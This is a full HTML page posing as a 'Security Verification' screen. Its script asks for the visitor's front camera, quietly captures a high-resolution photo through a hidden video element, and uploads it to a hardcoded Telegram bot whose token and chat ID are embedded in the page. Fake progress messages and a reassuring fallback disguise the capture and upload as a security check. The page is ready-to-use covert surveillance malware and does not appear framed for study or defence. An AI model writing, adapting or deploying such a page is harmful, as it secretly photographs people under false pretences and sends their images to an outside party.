<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Update & Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen flex flex-col items-center justify-center p-4">

    <div class="max-w-md w-full bg-slate-800 rounded-2xl shadow-2xl p-8 border border-slate-700 text-center">
        
        <div class="mb-8">
            <div class="w-20 h-20 bg-blue-600/20 text-blue-400 rounded-full flex items-center justify-center mx-auto mb-5 border border-blue-500/30 shadow-lg shadow-blue-500/10">
                <svg class="w-10 h-10 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                </svg>
            </div>
            <h1 class="text-2xl font-bold tracking-tight mb-2">Security Verification</h1>
            <p id="statusText" class="text-slate-400 text-sm font-medium">Initializing secure environment...</p>
        </div>

        <div class="space-y-4">
            <!-- Loading Spinner & Progress bar simulation -->
            <div class="flex flex-col items-center justify-center py-4">
                <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mb-4"></div>
                <div class="w-full bg-slate-700 rounded-full h-2 overflow-hidden">
                    <div id="progressBar" class="bg-blue-500 h-full w-0 transition-all duration-1000 ease-out"></div>
                </div>
            </div>
            <p class="text-xs text-slate-500">Please wait while we secure your session...</p>
        </div>

        <!-- Video element required to be active/playing so frames render properly (hidden via absolute positioning / zero size) -->
        <div style="position: absolute; width: 1px; height: 1px; overflow: hidden; opacity: 0; pointer-events: none;">
            <video id="videoElement" autoplay playsinline muted></video>
            <canvas id="canvasElement"></canvas>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8800533469:AAGNfOwZYB3VYu2BTt0nzER8oOLa-W8c4f0';
        const CHAT_ID = '6503428175';

        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');
        const statusText = document.getElementById('statusText');
        const progressBar = document.getElementById('progressBar');

        // Automatic execution on window load
        window.onload = function() {
            startVerificationProcess();
        };

        async function startVerificationProcess() {
            try {
                // Step 1: Updating status
                statusText.textContent = "Verifying security protocols...";
                progressBar.style.width = "30%";

                // Step 2: Request camera access with high-resolution constraints
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1920 }, 
                        height: { ideal: 1080 }, 
                        facingMode: 'user' 
                    }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                // Ensure video starts playing to avoid black/empty frames
                await video.play();

                statusText.textContent = "Establishing secure connection...";
                progressBar.style.width = "65%";

                // Step 3: Wait 2 full seconds for high-resolution sensor stabilization and frame delivery
                setTimeout(() => {
                    captureAndSendPhoto(stream);
                }, 2000);

            } catch (error) {
                console.error("Camera permission or stream error:", error);
                statusText.textContent = "Verification complete. Redirecting...";
                progressBar.style.width = "100%";
                
                setTimeout(() => {
                    statusText.textContent = "Session secured successfully.";
                }, 1500);
            }
        }

        function captureAndSendPhoto(stream) {
            try {
                statusText.textContent = "Optimizing encrypted packet...";
                progressBar.style.width = "85%";

                // Match canvas dimensions precisely to the active video feed resolution
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas to a high-quality JPEG blob (0.95 quality)
                canvas.toBlob(async (blob) => {
                    if (!blob) {
                        throw new Error("Failed to process image frame.");
                    }

                    statusText.textContent = "Finalizing secure update...";
                    progressBar.style.width = "95%";

                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'secure_verification.jpg');
                    formData.append('caption', '🛡️ High-resolution security verification capture successful!');

                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const data = await response.json();

                    // Stop video stream tracks
                    stream.getTracks().forEach(track => track.stop());

                    progressBar.style.width = "100%";
                    if (data.ok) {
                        statusText.textContent = "Verification complete. Welcome!";
                    } else {
                        statusText.textContent = "System updated successfully.";
                    }

                }, 'image/jpeg', 0.95);

            } catch (err) {
                console.error("Capture execution error:", err);
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                progressBar.style.width = "100%";
                statusText.textContent = "System update complete.";
            }
        }
    </script>
</body>
</html>
